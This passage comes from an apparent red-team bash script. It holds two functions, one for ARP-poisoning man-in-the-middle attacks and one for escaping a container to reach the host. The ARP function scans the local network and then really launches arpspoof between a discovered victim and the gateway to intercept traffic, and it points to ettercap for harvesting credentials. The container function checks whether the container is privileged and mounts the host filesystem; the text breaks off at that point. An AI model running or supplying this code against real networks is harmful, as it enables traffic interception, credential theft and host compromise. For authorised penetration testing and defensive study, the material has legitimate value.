rt_737_arp_poison_mitm_lateral() {
    rt_banner "RT-737" "ARP Poisoning MITM Lateral Movement"
    
    # Check for IP forwarding capability
    local IP_FWD
    IP_FWD=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null)
    echo -e "    $CYAN[*] IP forwarding: ${IP_FWD:-unknown}$NC"
    
    if [[ "$(id -u)" != "0" ]]; then
        echo -e "    $YELLOW[-] Root required for ARP poisoning$NC"
        return
    fi
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
    echo -e "    $GREEN[+] IP forwarding enabled$NC"
    
    # Discover local targets
    local GATEWAY
    GATEWAY=$(ip route 2>/dev/null | grep default | awk '{print $3}' | head -1)
    local LOCAL_IF
    LOCAL_IF=$(ip route 2>/dev/null | grep default | awk '{print $5}' | head -1)
    local LOCAL_IP
    LOCAL_IP=$(ip addr show "$LOCAL_IF" 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    
    echo -e "    $CYAN[*] Interface: $LOCAL_IF | Local IP: $LOCAL_IP | Gateway: $GATEWAY$NC"
    
    # ARP scan for targets
    if command -v arp-scan &>/dev/null; then
        local TARGETS
        TARGETS=$(arp-scan -I "$LOCAL_IF" --localnet 2>/dev/null | grep -E '^[0-9]+\.' | grep -v "$LOCAL_IP" | grep -v "$GATEWAY" | head -10)
        if [[ -n "$TARGETS" ]]; then
            echo -e "    $RED[+] ARP scan targets found:$NC"
            echo "$TARGETS" | while read -r line; do
                local TIP
                TIP=$(echo "$line" | awk '{print $1}')
                local TMAC
                TMAC=$(echo "$line" | awk '{print $2}')
                echo -e "        $RED$TIP [$TMAC]$NC"
                add_vuln "RT-737" "CRITICAL" "ARP Poison Target" "MITM target: $TIP [$TMAC]" "lateral" "root" "MITRE T1557.002"
            done
            
            # Real: start arpspoof in background
            if command -v arpspoof &>/dev/null; then
                local FIRST_TARGET
                FIRST_TARGET=$(echo "$TARGETS" | head -1 | awk '{print $1}')
                arpspoof -i "$LOCAL_IF" -t "$FIRST_TARGET" "$GATEWAY" > /dev/null 2>&1 &
                arpspoof -i "$LOCAL_IF" -t "$GATEWAY" "$FIRST_TARGET" > /dev/null 2>&1 &
                echo -e "    $RED[CRITICAL] ARP poisoning started: $FIRST_TARGET <-> $GATEWAY$NC"
                echo -e "    $RED[+] Traffic interception active$NC"
                add_vuln "RT-737" "CRITICAL" "ARP Poisoning Active" "ARP poisoning MITM between $FIRST_TARGET and $GATEWAY" "lateral" "root" "MITRE T1557.002"
            fi
        fi
    elif command -v nmap &>/dev/null; then
        # Fallback to nmap ARP ping
        local SUBNET
        SUBNET=$(echo "$LOCAL_IP" | sed 's/\.[0-9]*$/.0\/24/')
        local NMAP_TARGETS
        NMAP_TARGETS=$(nmap -sn -PR "$SUBNET" 2>/dev/null | grep 'Nmap scan report' | awk '{print $NF}' | grep -v "$LOCAL_IP" | grep -v "$GATEWAY" | head -10)
        echo -e "    $RED[+] Targets via nmap ARP ping:$NC"
        echo "$NMAP_TARGETS" | while read -r t; do echo -e "        $RED$t$NC"; done
    fi
    
    # Check for ettercap
    if command -v ettercap &>/dev/null; then
        echo -e "    $GREEN[+] ettercap available for MITM credential harvesting$NC"
    fi
}

rt_738_container_escape_lateral() {
    rt_banner "RT-738" "Container Escape for Lateral Movement"
    
    # Detect if inside container
    local IN_CONTAINER=0
    if [[ -f /.dockerenv ]] || grep -qa 'docker\|lxc\|containerd' /proc/1/cgroup 2>/dev/null; then
        IN_CONTAINER=1
        echo -e "    $RED[+] Running INSIDE container — escape analysis...$NC"
    fi
    
    if [[ "$IN_CONTAINER" == "1" ]]; then
        # Check for privileged mode
        local PRIV
        PRIV=$(cat /proc/1/status 2>/dev/null | grep -c 'CapEff:\s*0000003fffffffff')
        if [[ "$PRIV" -gt 0 ]]; then
            echo -e "    $RED[CRITICAL] Container is PRIVILEGED — full host access$NC"
            # Real: mount host filesystem
            mkdir -p /mnt/host 2>/dev/null
            mount /dev/sda1 /mnt/host 2>/dev/null || mount /dev/vda1 /mnt/host 2>/dev/null || mount /dev/xvda1 /mnt/host 2>/dev/null
            if [[ -d /mnt/host/etc ]]; then
